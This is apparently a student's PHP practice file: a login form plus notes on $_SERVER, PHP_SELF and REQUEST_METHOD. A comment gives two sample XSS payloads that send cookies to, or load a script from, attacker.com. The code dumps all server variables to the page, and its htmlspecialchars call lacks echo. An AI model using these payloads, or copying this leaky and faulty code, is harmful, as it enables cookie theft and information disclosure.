<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PHP Server | 22</title>
</head>
<body>
<!-- PHP_SELF = /website/index.php (is the location of the PAGE)
       Sample 2: Using PHP_SELF
       Using automatically update the file name (ex. index.php to login.php) 
       Instead of using action="index.php" for action, 
       we use action="<?php $_SERVER["PHP_SELF"]?>"
       this key contains the value of file path/name 
       for this file.

       Downside: The PHP_SELF it is vulnerable to
       the CROSS SITE SCRIPTS (eg. SANITIZE & VALIDATION)
       ex. <script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
           <script src="http://attacker.com/malicious.js"></script>

       to avoid that we use htmlspecialchars()
       ex. action="<?php htmlspecialchars($_SERVER["PHP_SELF"]) ?>"
  -->
  <form action="<?php htmlspecialchars($_SERVER["PHP_SELF"]) ?>" method="post"> 

  <!-- Header -->
  <header>
    <h3>Log In Page</h3>
  </header>

  <main>
    <!-- Username -->
    <label for="username">Username:</label> <br>
    <input type="text" name="username" id="username"> <br>

    <!-- Password -->
     <label for="password">Password:</label> <br>
     <input type="password" name="password" id="password"> <br>

    <!-- Login button -->
     <input type="submit" name="login" value="Log In">
  </main>
    
  </form>

</body>
</html>

<?php

  // $_SERVER = SGB(Super Global Variable) that contains headers,
  //            paths, and script locations.

  //            The entries in this array are created by the web server.
  //            Shows nearly everything you need to know about the 
  //            current web page environment.

  // Sample 1: Accessing the SGB $_SERVER using foreach() loop
  //           to iterate the all key=value pairs and arrow => function
  foreach($_SERVER as $key => $value) {
    echo "{$key} = {$value} <br>"; // shows all key=value pairs from SGB $_SERVER
  }
  

  // REQUEST_METHOD = GET (is either GET or POST method but GET is default)
  // Sampl 3: Using REQUEST_METHOD to know and 
  // DETECT if login form was submitted

  // Option 1: Common use of Condition using isset()
  //           but the problem on this option, old browsers automatically
  //           submit the FORM without clicking or hitted the login btn
  // if(isset($_POST["submit"])) {

  // }

  // Option 2: More reliable condition option using $_SERVER
  if($_SERVER["REQUEST_METHOD"] == "POST") {
    echo "YOUR REQUEST_METHOD WAS SETTED TO: POST"; // display if REQUEST_METHOD is post from <form>
  }
  else {
    echo "YOUR REQUEST_METHOD WAS SETTED TO: GET"; // display if REQUEST_METHOD is get from <form>

  }
?>